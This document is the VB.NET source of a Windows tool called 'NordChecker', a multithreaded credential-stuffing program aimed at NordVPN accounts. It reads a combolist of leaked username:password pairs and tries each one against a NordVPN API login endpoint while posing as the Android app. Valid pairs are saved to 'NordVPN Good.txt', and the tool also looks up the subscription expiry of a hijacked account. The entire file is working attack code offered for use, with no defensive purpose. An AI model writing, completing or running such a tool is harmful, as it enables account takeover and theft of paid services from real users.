Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices

Public Class NordChecker

    Private Combolist As Queue(Of String)

    Private threads As Queue(Of Thread)

    Private token As String

    Private expires As String

    Public Sub New()
        Me.threads = New Queue(Of Thread)()
        Me.InitializeComponent()
    End Sub
    Private Sub CloseButton_Click(sender As Object, e As EventArgs) Handles CloseButton.Click
        Environment.Exit(0)
    End Sub

    Private Sub MinimizeButton_Click(sender As Object, e As EventArgs) Handles MinimizeButton.Click
        WindowState = FormWindowState.Minimized
    End Sub

    Private Sub TopMostToggle_CheckedChanged(sender As Object, e As EventArgs) Handles TopMostToggle.CheckedChanged
        Me.TopMost = TopMostToggle.Checked
    End Sub

    Private Sub ImportComboButton_Click(sender As Object, e As EventArgs) Handles ImportComboButton.Click
        Using OFD As OpenFileDialog = New OpenFileDialog()
            OFD.Title = "Load combolist."
            OFD.Filter = "Text Files|*.txt"
            OFD.Multiselect = False
            If (OFD.ShowDialog() = DialogResult.OK) Then
                Me.Combolist = New Queue(Of String)(File.ReadAllLines(OFD.FileName))
                Me.ComboAmount.Text = Conversions.ToString(Me.Combolist.Count)
            End If
        End Using
    End Sub
    Private Shared Function ReadResponse(ByVal response As HttpWebResponse) As String
        Dim [end] As String
        Try
            Using responseStream As Stream = response.GetResponseStream()
                Dim streamToRead As Stream = responseStream
                If (response.ContentEncoding.ToLower().Contains("gzip")) Then
                    streamToRead = New GZipStream(streamToRead, CompressionMode.Decompress)
                ElseIf (response.ContentEncoding.ToLower().Contains("deflate")) Then
                    streamToRead = New DeflateStream(streamToRead, CompressionMode.Decompress)
                End If
                Using streamReader As System.IO.StreamReader = New System.IO.StreamReader(streamToRead, Encoding.UTF8)
                    [end] = streamReader.ReadToEnd()
                End Using
            End Using
        Catch exception As System.Exception
            ProjectData.SetProjectError(exception)
            [end] = "httpreadingerror"
            ProjectData.ClearProjectError()
        End Try
        Return [end]
    End Function
    Public Sub checksub()
        Dim enumerator As IEnumerator = Nothing
        Dim PostRequest As HttpWebRequest = DirectCast(WebRequest.Create("https://zwyr157wwiu6eior.com/v1/users/services"), HttpWebRequest)
        PostRequest.Method = "GET"
        PostRequest.KeepAlive = True
        PostRequest.ContentType = "application/x-www-form-urlencoded"
        PostRequest.UserAgent = "NordApp android (playstore/2.7.3) Android 8.1.0"
        PostRequest.Accept = "*/*"
        PostRequest.Headers.Add("Authorization", String.Concat("Basic `", Me.token, "`"))
        Dim response As String = NordChecker.ReadResponse(DirectCast(PostRequest.GetResponse(), HttpWebResponse))
        If (response.Contains("expires_at"":""")) Then
            Dim matches2 As MatchCollection = (New Regex("(?<=expires_at"":"").*(?="",""ignore_expires_at)")).Matches(response)
            Try
                enumerator = matches2.GetEnumerator()
                While enumerator.MoveNext()
                    Me.expires = DirectCast(enumerator.Current, Match).Value.ToString()
                End While
            Finally
            End Try
        End If
    End Sub
    Public Sub startcheck()
        Control.CheckForIllegalCrossThreadCalls = False
        Dim value As Decimal = Me.ThreadBox.Text
        Dim i As Decimal = Decimal.Zero
        While Decimal.Compare(i, value) <= 0
            Dim trd As Thread = New Thread(Sub()
                                               Dim enumerator As IEnumerator = Nothing
                                               While Me.Combolist.Count <> 0
                                                   Dim item As String = Me.Combolist.Dequeue()
                                                   If (item IsNot Nothing) Then
                                                       If (item.Contains(":")) Then
                                                           Dim user As String = item.Split(New Char() {":"c})(0)
                                                           Dim pass As String = item.Split(New Char() {":"c})(1)
                                                           Try
                                                               Dim byteData As Byte() = (New UTF8Encoding()).GetBytes(String.Concat("username=", user, "&password=", pass))
                                                               Dim PostRequest As HttpWebRequest = DirectCast(WebRequest.Create("https://zwyr157wwiu6eior.com/v1/users/tokens"), HttpWebRequest)
                                                               PostRequest.Method = "POST"
                                                               PostRequest.KeepAlive = True
                                                               PostRequest.ContentType = "application/x-www-form-urlencoded"
                                                               PostRequest.UserAgent = "NordApp android (playstore/2.7.3) Android 8.1.0"
                                                               PostRequest.ContentLength = CLng(CInt(byteData.Length))
                                                               PostRequest.Accept = "*/*"
                                                               Using Request As Stream = PostRequest.GetRequestStream()
                                                                   Request.Write(byteData, 0, CInt(byteData.Length))
                                                               End Using
                                                               Dim response As String = NordChecker.ReadResponse(DirectCast(PostRequest.GetResponse(), HttpWebResponse))
                                                               If (response.Contains("token"":""")) Then
                                                                   Dim matches2 As MatchCollection = (New Regex("(?<=token"":"").*(?="",""expires_at)")).Matches(response)
                                                                   Try
                                                                       enumerator = matches2.GetEnumerator()
                                                                       While enumerator.MoveNext()
                                                                           Me.token = DirectCast(enumerator.Current, Match).Value.ToString()
                                                                       End While
                                                                   Finally
                                                                   End Try
                                                                   Me.GoodHitsAmount.Text = Conversions.ToString(Conversions.ToDouble(Me.GoodHitsAmount.Text) + 1)
                                                                   Me.CheckedAmount.Text = Conversions.ToString(Conversions.ToDouble(Me.CheckedAmount.Text) + 1)
                                                                   Me.ResultsBox.Text = String.Concat(New String() {Me.ResultsBox.Text, "============================================" & vbCrLf & "", user, ":", pass, "" & vbCrLf & "============================================" & vbCrLf & ""})
                                                                   My.Computer.FileSystem.WriteAllText("NordVPN Good.txt", String.Concat(New String() {"============================================", Environment.NewLine, user, ":", pass, Environment.NewLine, "============================================", Environment.NewLine}), True)
                                                               ElseIf (response.Contains("message"":""Unauthorized")) Then
                                                                   Me.BadHitsAmount.Text = Conversions.ToString(Conversions.ToDouble(Me.BadHitsAmount.Text) + 1)
                                                                   Me.CheckedAmount.Text = Conversions.ToString(Conversions.ToDouble(Me.CheckedAmount.Text) + 1)
                                                               End If
                                                           Catch webException As System.Net.WebException
                                                               If (Not NordChecker.ReadResponse(DirectCast(webException.Response, HttpWebResponse)).Contains("message"":""Unauthorized")) Then
                                                                   Me.ErrorsAmount.Text = Conversions.ToString(Conversions.ToDouble(Me.ErrorsAmount.Text) + 1)
                                                                   Me.Combolist.Enqueue(item)
                                                               Else
                                                                   Me.BadHitsAmount.Text = Conversions.ToString(Conversions.ToDouble(Me.BadHitsAmount.Text) + 1)
                                                                   Me.CheckedAmount.Text = Conversions.ToString(Conversions.ToDouble(Me.CheckedAmount.Text) + 1)
                                                               End If
                                                           End Try
                                                       End If
                                                   End If
                                               End While
                                           End Sub) With
            {
                .IsBackground = True
            }
            Me.threads.Enqueue(trd)
            trd.Start()
            i = Decimal.Add(i, Decimal.One)
        End While
    End Sub

    Private Sub StartStopButton_Click(sender As Object, e As EventArgs) Handles StartStopButton.Click
        Me.startcheck()
    End Sub
End Class


